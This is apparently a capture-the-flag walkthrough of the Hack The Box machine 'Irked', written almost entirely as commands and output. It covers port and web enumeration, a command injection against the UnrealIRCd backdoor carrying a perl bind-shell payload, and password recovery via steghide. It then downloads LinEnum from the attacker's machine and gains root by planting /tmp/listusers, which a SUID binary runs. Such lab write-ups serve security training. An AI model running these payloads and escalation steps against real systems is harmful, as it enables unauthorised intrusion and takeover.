RECON
root@kali:~/htb/irked# nmap -sC -sV -p- -vv -oA  full 10.10.10.117
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI+wKAAyWgx/P7Pe78y6/80XVTd6QEv6t5ZIpdzKvS8qbkChLB7LC+/HVuxLshOUtac4oHr/IF9YBytBoaAte87fxF45o3HS9MflMA4511KTeNwc5QuhdHzqXX9ne0ypBAgFKECBUJqJ23Lp2S9KuYEYLzUhSdUEYqiZlcc65NspAAAAFQDwgf5Wh8QRu3zSvOIXTk+5g0eTKQAAAIBQuTzKnX3nNfflt++gnjAJ/dIRXW/KMPTNOSo730gLxMWVeId3geXDkiNCD/zo5XgMIQAWDXS+0t0hlsH1BfrDzeEbGSgYNpXoz42RSHKtx7pYLG/hbUr4836olHrxLkjXCFuYFo9fCDs2/QsAeuhCPgEDjLXItW9ibfFqLxyP2QAAAIAE5MCdrGmT8huPIxPI+bQWeQyKQI/lH32FDZb4xJBPrrqlk9wKWOa1fU2JZM0nrOkdnCPIjLeq9+Db5WyZU2u3rdU8aWLZy8zF9mXZxuW/T3yXAV5whYa4QwqaVaiEzjcgRouex0ev/u+y5vlIf4/SfAsiFQPzYKomDiBtByS9XA==
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDDGASnp9kH4PwWZHx/V3aJjxLzjpiqc2FOyppTFp7/JFKcB9otDhh5kWgSrVDVijdsK95KcsEKC/R+HJ9/P0KPdf4hDvjJXB1H3Th5/83gy/TEJTDJG16zXtyR9lPdBYg4n5hhfFWO1PxM9m41XlEuNgiSYOr+uuEeLxzJb6ccq0VMnSvBd88FGnwpEoH1JYZyyTnnbwtBrXSz1tR5ZocJXU4DmI9pzTNkGFT+Q/K6V/sdF73KmMecatgcprIENgmVSaiKh9mb+4vEfWLIe0yZ97c2EdzF5255BalP3xHFAY0jROiBnUDSDlxyWMIcSymZPuE1N6Tu8nQ/pXxKvUar
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFeZigS1PimiXXJSqDy2KTT4UEEphoLAk8/ftEXUq0ihDOFDrpgT0Y4vYgYPXboLlPBKBc0nVBmKD+6pvSwIEy8=
|   256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC6m+0iYo68rwVQDYDejkVvsvg22D8MN+bNWMUEOWrhj
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          36293/udp  status
|_  100024  1          57651/tcp  status
6697/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
8067/tcp  open  irc     syn-ack ttl 63 UnrealIRCd
57651/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
65534/tcp open  irc     syn-ack ttl 63 UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

WEB ENUM
root@kali:~/htb/irked# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u  http://10.10.10.117 -x png,txt,db,php,jpg,py,config,html -s 200,204,301,302,307,403 -t 100

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.117/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 403,200,204,301,302,307
[+] Extensions   : .png,.txt,.db,.php,.jpg,.py,.config,.html
=====================================================
/index.html (Status: 200)
/manual (Status: 301)
/server-status (Status: 403)
=====================================================

WEAPONIZATION
https://metalkey.github.io/unrealircd-3281-backdoor-command-execution.html

root@kali:~/htb/irked# msfvenom -p cmd/unix/bind_perl LHOST=10.10.10.117
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 240 bytes
perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'

EXPLOIT
root@kali:~/htb/irked# nc -vn 10.10.10.117 6697
(UNKNOWN) [10.10.10.117] 6697 (ircs-u) open
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB;perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'
:irked.htb 451 AB;perl :You have not registered
ERROR :Closing Link: [10.10.14.8] (Ping timeout)

GET REVERSE SHELL
root@kali:~/htb/irked# nc -vn 10.10.10.117 4444
(UNKNOWN) [10.10.10.117] 4444 (?) open

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
pwd
/home/ircd/Unreal3.2

UPGRADE SHELL
python -c 'import pty;pty.spawn("/bin/bash")'
ircd@irked:~/Unreal3.2$ 

REVIEW INTERESTING DIRECTORY
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss

DOWNLOAD IRKED IMAGE
root@kali:~/htb/irked# curl -O http://10.10.10.117/irked.jpg

REVIEW FILE WITH STEGHIDE
root@kali:~/htb/irked# steghide info irked.jpg
"irked.jpg":
  format: jpeg
  capacity: 1.5 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "pass.txt":
    size: 17.0 Byte
#    encrypted: rijndael-128, cbc
    compressed: yes

EXTRACT HIDDEN CONTENT AND DECRYPT WITH BACKUP PASSWORD
root@kali:~/htb/irked# steghide extract -sf irked.jpg
Enter passphrase: 
wrote extracted data to "pass.txt".
root@kali:~/htb/irked# ls
irc.pl  irked.jpg  irk.txt  pass.txt
root@kali:~/htb/irked# cat pass.txt
##   Kab6h+m+bbp2J:HG
root@kali:~/htb/irked# 

CHANGE TO DJMARDOV USER
ircd@irked:~/Unreal3.2$ su djmardov
su djmardov
Password: Kab6h+m+bbp2J:HG

djmardov@irked:/home/ircd/Unreal3.2$

GET USER FLAG
djmardov@irked:/home/ircd/Unreal3.2$ cat /home/djmardov/Documents/user.txt
cat /home/djmardov/Documents/user.txt
#################################

PRIVESC

DOWNLOAD AND RUN LINENUM
root@kali:~/htb/irked# python -m SimpleHTTPServer 80
djmardov@irked:/tmp$ wget 10.10.14.8/LinEnum.sh
djmardov@irked:/tmp$ chmod +x LinEnum.sh
djmardov@irked:/tmp$ ./LinEnum.sh

REVIEW LINEUM RESULTS
./LinEnum.sh

#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Mon Nov 30 20:59:00 EST 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux


[-] Kernel information (continued):
Linux version 3.16.0-6-686-pae (debian-kernel@lists.debian.org) (gcc version 4.9.2 (Debian 4.9.2-10+deb8u1) ) #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08)


[-] Specific release information:
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"


[-] Hostname:
irked


### USER/GROUP ##########################################
[-] Current user/group info:
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)


[-] Users that have previously logged onto the system:
Username         Port     From             Latest
djmardov         pts/1    10.33.3.3        Tue May 15 08:56:32 -0400 2018


[-] SUID files:
-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4
-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd
-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh
-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail
-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50644 Sep 30  2014 /usr/bin/at
-rwsr-xr-x 1 root root 18072 Sep  8  2016 /usr/bin/pkexec
-rwsr-sr-x 1 root root 9468 Apr  1  2014 /usr/bin/X
-rwsr-xr-x 1 root root 53112 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 52344 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
-rwsr-xr-x 1 root root 96760 Aug 13  2014 /sbin/mount.nfs
-rwsr-xr-x 1 root root 38868 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 34684 Mar 29  2015 /bin/mount
-rwsr-xr-x 1 root root 34208 Jan 21  2016 /bin/fusermount
-rwsr-xr-x 1 root root 161584 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26344 Mar 29  2015 /bin/umount


REVIEW VIEWUSER SCRIPT
djmardov@irked:/tmp$ cat /usr/bin/viewuser
cat /usr/bin/viewuser
ELF@4ï¿½4 	(444  TTTï¿½ï¿½ï¿½04ï¿½ï¿½ï¿½ï¿½ï¿½hhhDDPï¿½td44Qï¿½tdRï¿½tdï¿½ï¿½ï¿½
        
         /lib/ld-linux.so.2GNUGNUiï¿½Kï¿½[ï¿½ 7ï¿½ï¿½I+ï¿½ï¿½ï¿½Uï¿½Ä»	  	ï¿½Kï¿½ï¿½d -"!&ï¿½ <ï¿½ 
                                                                                            |libc.so.6_IO_stdin_usedsetuidputssystem__cxa_finalize__libc_start_mainGLIBC_2.0GLIBC_2.1.3_ITM_deNsierXï¿½ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½tart___ITM_registerTMCloneTableii
                               Sï¿½ï¿½ï¿½ï¿½ï¿½;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½tï¿½^ï¿½[ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                                                                 hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½fï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½fï¿½1ï¿½^ï¿½ï¿½ï¿½ï¿½ï¿½PTRï¿½"ï¿½Ã°ï¿½ï¿½`ï¿½ï¿½ï¿½Pï¿½ï¿½ï¿½ï¿½ï¿½PQVï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½$ï¿½fï¿½fï¿½fï¿½fï¿½fï¿½ï¿½$ï¿½fï¿½fï¿½fï¿½fï¿½fï¿½fï¿½ï¿½ï¿½ï¿½ï¿½kï¿½ï¿½$ï¿½ï¿½$9ï¿½tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½tUï¿½ï¿½ï¿½ï¿½Qï¿½Ðï¿½ï¿½Ãï¿½t&ï¿½Ãï¿½ï¿½ï¿½ï¿½ï¿½+Uï¿½ï¿½$ï¿½ï¿½$)Èï¿½Sï¿½ï¿½ï¿½Ãï¿½ï¿½ï¿½ï¿½ï¿½ï¿½tï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½t
ï¿½PQï¿½Òï¿½ï¿½]ï¿½ï¿½Ãï¿½ï¿½ï¿½'Uï¿½ï¿½Sï¿½Wï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½$u'ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½tï¿½ï¿½
                                                ï¿½ï¿½ ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½5ï¿½ï¿½ï¿½Æ$ï¿½]ï¿½ï¿½Ãï¿½ï¿½ï¿½'Uï¿½ï¿½]ï¿½Wï¿½ï¿½ï¿½ï¿½$ÃL$ï¿½ï¿½ï¿½ï¿½qï¿½Uï¿½ï¿½SQï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½oï¿½ï¿½
                 ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Pï¿½Jï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                                  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Pï¿½8ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                                                   ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Pï¿½6ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                                                                    jï¿½Iï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                                                                               ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Pï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½eï¿½Y[]ï¿½aï¿½ï¿½fï¿½fï¿½ï¿½UWVSï¿½wï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
                            ï¿½l$(ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½ï¿½ï¿½ï¿½t%1ï¿½ï¿½ï¿½ï¿½ï¿½Uï¿½t$,ï¿½t$,ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½9ï¿½uï¿½ï¿½ï¿½
                                                                                             [^_]Ãvï¿½ï¿½Sï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ãï¿½[ï¿½This application is being devleoped to set and test user permissionsIt is still being actively developedwho/tmp/listusers;0ï¿½ï¿½ï¿½ï¿½L0ï¿½ï¿½ï¿½p}ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½`ï¿½ï¿½ï¿½zR
                                                                                 ï¿½ ï¿½ï¿½ï¿½ï¿½F
                                                                                            J
                                                                                             tx?;*2$"@ï¿½ï¿½ï¿½ï¿½0Tï¿½ï¿½ï¿½ï¿½~D
                     GuDuxu|iï¿½
                                       Aï¿½Aï¿½C
                                             Hï¿½@ï¿½ï¿½ï¿½]ï¿½A
                                                         ï¿½Aï¿½Aï¿½N i$A(D,D0M GAï¿½Aï¿½
                                                                                     AAï¿½ï¿½Tï¿½ï¿½ï¿½p 
dï¿½ï¿½ï¿½ï¿½ï¿½oï¿½lï¿½
ï¿½
   ï¿½\@ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½o,ï¿½ï¿½ï¿½oï¿½ï¿½ï¿½oï¿½ï¿½ï¿½o}ï¿½ï¿½&  GCC: (Debian 7.2.0-8) 7.2.0Thï¿½ï¿½ï¿½l,\	ï¿½
ï¿½
   ï¿½
@dx4ï¿½ï¿½ï¿½ï¿½  $ ï¿½ï¿½
                                                ï¿½ï¿½! 7$ Fï¿½mpyï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ` 3ï¿½ï¿½  I$ dPyf"ï¿½ ï¿½ï¿½ï¿½ ï¿½  ï¿½|ï¿½ï¿½]ï¿½( ï¿½@	x$ }~!3$ ? ï¿½
                                           crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.6586__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryviewuser.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_fini_ITM_deregisterTMCloneTable__x86.get_pc_thunk.bx_edata__x86.get_pc_thunk.dx__cxa_finalize@@GLIBC_2.1.3__data_startputs@@GLIBC_2.0system@@GLIBC_2.0__gmon_start____dso_handle_IO_stdin_used__libc_start_main@@GLIBC_2.0__libc_csu_init_fp_hw__bss_startmainsetuid@@GLIBC_2.0__TMC_END___ITM_registerTMCloneTable.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rel.dyn.rel.plt.init.plt.got.text.fini.rodata.eh_frame_hdr.eh_frame.init_array.fini_array.dynamic.got.plt.data.bss.commentTT#hh 1ï¿½ï¿½$Dï¿½ï¿½ï¿½oï¿½ï¿½ N
        ï¿½ï¿½ï¿½Vllï¿½^ï¿½ï¿½ï¿½okï¿½ï¿½ï¿½o,,0z	\\@ï¿½	Bï¿½ï¿½ ï¿½ï¿½ï¿½#ï¿½ï¿½ï¿½Pï¿½00ï¿½@@"ï¿½ddï¿½xxï¿½ï¿½4ï¿½44ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½ $ $ï¿½0$@P,	ï¿½Yï¿½djmardov@irked:/tmp$ 

RUN VIEW USER
djmardov@irked:/tmp$ ls -la /usr/bin/viewuser
ls -la /usr/bin/viewuser
-rwsr-xr-x 1 root root 7328 May 16  2018 /usr/bin/viewuser
djmardov@irked:/tmp$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-11-30 11:04 (:0)
sh: 1: /tmp/listusers: not found

CREATE PAYLOAD TO GET ROOT SHELL WHEN VIEWUSER RUNS
djmardov@irked:/tmp$ echo '/bin/sh' >/tmp/listusers    
echo '/bin/sh' >/tmp/listusers

MAKE THE FILE EXECUTABLE
djmardov@irked:/tmp$ chmod +x listusers
chmod +x listusers
djmardov@irked:/tmp$ ls -la  
ls -la
total 100
drwxrwxrwt 11 root     root      4096 Nov 30 21:11 .
drwxr-xr-x 21 root     root      4096 May 15  2018 ..
drwxrwxrwt  2 root     root      4096 Nov 30 11:04 .font-unix
drwxrwxrwt  2 root     root      4096 Nov 30 11:04 .ICE-unix
-rwx------  1 djmardov djmardov 46631 Nov 30 15:12 LinEnum.sh
-rwx------  1 djmardov djmardov     8 Nov 30 21:11 listusers
drwx------  3 root     root      4096 Nov 30 11:04 systemd-private-dea2269dd17d45c6b86ad96b44989cd5-colord.service-aem5bd
drwx------  3 root     root      4096 Nov 30 11:09 systemd-private-dea2269dd17d45c6b86ad96b44989cd5-cups.service-SEUYmX
drwx------  3 root     root      4096 Nov 30 11:04 systemd-private-dea2269dd17d45c6b86ad96b44989cd5-rtkit-daemon.service-8SOANg
drwxrwxrwt  2 root     root      4096 Nov 30 11:04 .Test-unix
drwx------  2 root     root      4096 Nov 30 11:04 vmware-root
-r--r--r--  1 root     root        11 Nov 30 11:04 .X0-lock
drwxrwxrwt  2 root     root      4096 Nov 30 11:04 .X11-unix
drwxrwxrwt  2 root     root      4096 Nov 30 11:04 .XIM-unix

RUN VIEWUSER SCRIPT
djmardov@irked:/tmp$ /usr/bin/viewuser
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2020-11-30 11:04 (:0)

GET ROOT SHELL
# id
id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
# hostname
hostname
irked

GET ROOT FLAG
# cat /root/root.txt
cat /root/root.txt
###############################





